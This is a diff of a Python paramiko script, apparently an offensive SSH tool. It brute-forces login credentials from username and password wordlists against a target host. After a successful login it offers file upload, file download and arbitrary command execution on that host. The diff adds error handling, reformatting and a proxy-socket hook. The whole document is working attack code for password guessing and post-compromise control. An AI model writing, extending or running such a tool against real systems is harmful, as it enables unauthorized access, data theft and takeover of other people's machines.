@@ -1,22 +1,26 @@
 import paramiko
 import time
 
+
 # Define a function to connect to a remote host.
 def ssh(hostname, port):
     print("\nTarget's Data:\n")
     # Display the arguments.
     print(f"IP Address: {hostname}\n"
-        f"Port: {port}\n")
+          f"Port: {port}\n")
+
+    proxy = None
 
     ssh.paramiko_client = paramiko.SSHClient()
+    ssh.paramiko_client.load_system_host_keys()
     ssh.paramiko_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     while True:
         # Main loop. Main Menu.
         choice = input("Main Menu:\n"
-                    f"[1] Brute Force Credentials.\n"
-                    f"[2] Quit.\n"
-                    f"Enter Choice: ")
+                       f"[1] Brute Force Credentials.\n"
+                       f"[2] Quit.\n"
+                       f"Enter Choice: ")
 
         if choice == "1":
             name_file_usernames = input("Enter path to file with usernames: ")
@@ -40,20 +44,20 @@ def ssh(hostname, port):
                         print("\n[+] Executing one of the combinations...\n")
                         ssh.paramiko_client.connect(hostname=hostname, port=port,
                                                     username=username, password=password,
-                                                    timeout=4)
+                                                    timeout=4, sock=proxy)
 
                         print("\n[+] Success! Connected as:\n"
-                            f"Username: {username}\n"
-                            f"Password: {password}")
+                              f"Username: {username}\n"
+                              f"Password: {password}")
 
                         while True:
                             # Choosing an action.
                             choice = input("\nWhat do you want to do next?:\n"
-                                        f"[1] Upload File.\n"
-                                        f"[2] Download File.\n"
-                                        f"[3] Execute Command.\n"
-                                        f"[4] Quit.\n"
-                                        f"Enter Choice: ")
+                                           f"[1] Upload File.\n"
+                                           f"[2] Download File.\n"
+                                           f"[3] Execute Command.\n"
+                                           f"[4] Quit.\n"
+                                           f"Enter Choice: ")
 
                             if choice == "1":
                                 # Uploading a file.
@@ -73,7 +77,7 @@ def ssh(hostname, port):
                                     host_upload_file.close()
                                     sftp.close()
 
-                                    print("\n[+] Returning to main menu...\n")
+                                    print("[+] Returning to main menu...\n")
                                     continue
                                 # Error handling.
                                 except Exception as error:
@@ -98,7 +102,7 @@ def ssh(hostname, port):
                                     host_download_file.close()
                                     sftp.close()
 
-                                    print("\n[+] Returning to main menu...\n")
+                                    print("[+] Returning to main menu...\n")
                                     continue
                                 # Error handling.
                                 except Exception as error:
@@ -107,50 +111,62 @@ def ssh(hostname, port):
 
                             elif choice == "3":
                                 # Executing a command.
-                                command = input("Enter Command: ")
+                                try:
+                                    command = input("Enter Command: ")
 
-                                print("\nExecuting command...\n")
-                                stdin, stdout, stderr = ssh.paramiko_client.exec_command(command)
+                                    print("\nExecuting command...\n")
+                                    stdin, stdout, stderr = ssh.paramiko_client.exec_command(command)
 
-                                print("[+] Command:\n"
-                                    f"{stdout.read().decode('utf-8')}\n")
+                                    print("[+] Command:\n"
+                                        f"{stdout.read().decode('utf-8')}\n")
 
-                                print("\n[+] Returning to main menu...\n")
-                                continue
+                                    print("[+] Returning to main menu...\n")
+                                    continue
+                                # Error handling.
+                                except Exception as error:
+                                    print(f"[-] Error: {error}\n")
+                                    continue
 
                             elif choice == "4":
                                 # Closing connection.
-                                ssh.paramiko_client.close()
-                                file_usernames.close()
-                                file_passwords.close()
+                                try:
+                                    ssh.paramiko_client.close()
+                                    file_usernames.close()
+                                    file_passwords.close()
 
-                                print("\n[+] Closing connection...\n")
-                                break
+                                    print("\n[+] Closing connection...\n")
+                                    break
+                                # Error handling.
+                                except Exception as error:
+                                    print(f"[-] Error: {error}\n")
+                                    continue
 
                             else:
                                 # Invalid choice.
                                 print("[-] Invalid Choice! Try again.\n")
                                 continue
 
+                        break
+
                     # Error handling.
                     except paramiko.AuthenticationException as error:
                         print("[-] Authentication Error!\n"
-                            f"{error}")
+                              f"{error}")
                     # Error handling.
                     except paramiko.ssh_exception.SSHException as error:
                         print("[-] SSH Error!\n"
-                            f"{error}")
+                              f"{error}")
 
                     # Error handling.
                     except Exception as error:
                         print("[-] Unknown Error:\n"
-                            f"{error}")
+                              f"{error}")
 
                 else:
                     continue
-                
+
                 break
-                
+
             # Closing connection.
             file_usernames.close()
             file_passwords.close()
